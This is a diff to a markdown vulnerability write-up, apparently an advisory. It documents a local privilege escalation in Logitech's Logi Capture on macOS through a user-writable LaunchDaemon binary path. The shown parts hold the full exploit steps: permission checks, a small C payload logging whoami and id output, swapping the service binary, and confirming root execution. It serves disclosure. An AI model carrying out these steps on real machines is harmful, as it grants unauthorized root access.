@@ -36,7 +36,7 @@ The installation can be confirmed with the following command:
 ### Confirm the use of the vulnerable directory in the LaunchDaemons plist
 
 Confirmation that `Logi Capture` makes use of `/Library/Application Support/LogiFacecam.bundle/Contents/MacOS/LogiFacecamService` for the Launch Daemon in the `com.Logitech.LogiFacecam.Service.plist` Launch Daemons configuration plist file.
-```
+```xml
 10:41:06-testmac@mpro:~/Desktop/LOGITECH$ plutil -convert xml1 /Library/LaunchDaemons/com.Logitech.LogiFacecam.Service.plist -o /tmp/com.Logitech.LogiFacecam.Service.plist.xml
 10:41:19-testmac@mpro:~/Desktop/LOGITECH$ cat /tmp/com.Logitech.LogiFacecam.Service.plist.xml 
 <?xml version="1.0" encoding="UTF-8"?>
@@ -62,14 +62,14 @@ Confirmation that `Logi Capture` makes use of `/Library/Application Support/Logi
 
 ### Confirm the presence of the `com.Logitech.LogiFacecam.Service` Launch Daemon
 The `com.Logitech.LogiFacecam.Service` can be confirmed to be configured in `launchd` by using the following `launchctl` command:
-```
+```bash
 10:06:53-testmac@mpro:~/Desktop/LOGITECH$ sudo launchctl list | grep -i logitech
 283     0       com.Logitech.LogiFacecam.Service
 ```
 
 ### Confirm the weak directory permissions
 The directory permissions can be confirmed with the following command:
-```
+```bash
 10:08:57-testmac@mpro:~/Desktop/LOGITECH$ ls -@ -lah "/Library/Application Support/LogiFacecam.bundle/Contents/MacOS/"
 total 600
 drwxr-xr-x@ 3 testmac  staff    96B 24 Oct  2021 .
@@ -80,7 +80,7 @@ drwxr-xr-x@ 8 testmac  staff   256B 24 Oct  2021 ..
 ### Prepare the malicious Mach-O
 
 The following c code can be compiled as the malicious dylib. The result of the `date`, `whoami` and `id` commands are redirected into the `/tmp/com.Logitech.LogiFacecam.Service.pwn` file. The contents can be arbritrary, e.g. changing file permissions on protected files, installing persistence or providing a root terminal.
-```
+```c
 /* gcc Logitech_LogiFacecam_LPE.c -o Logitech_LogiFacecam_LPE */
 #include <stdlib.h>
 int main() {
@@ -90,13 +90,14 @@ int main() {
     return 0;
 }
 ```
+
 The original `LogiFacecamService` Mach-O was preserved:
-```
+```bash
 11:04:10-testmac@mpro:~/Desktop/LOGITECH$ mv /Library/Application\ Support/LogiFacecam.bundle/Contents/MacOS/LogiFacecamService /Library/Application\ Support/LogiFacecam.bundle/Contents/MacOS/LogiFacecamService.bak
 ```
 
 The malicious `LogiFacecamService` Mach-O was copied to the vulnerable path:
-```
+```bash
 11:04:10-testmac@mpro:~/Desktop/LOGITECH$ cp Logitech_LogiFacecam_LPE /Library/Application\ Support/LogiFacecam.bundle/Contents/MacOS/LogiFacecamService
 ```
 
@@ -107,7 +108,7 @@ A reboot and a re-login will trigger `launchd` to load the malicious Mach-O and 
 
 ### Verify the `root` code execution
 The `/tmp/com.Logitech.LogiFacecam.Service.pwn` file contains the result of the `root` code execution:
-```
+```bash
 10:18:03-testmac@mpro:~$ ls /tmp/
 total 16
 drwxrwxrwt  7 root     wheel   224B 28 Dec 10:17 .
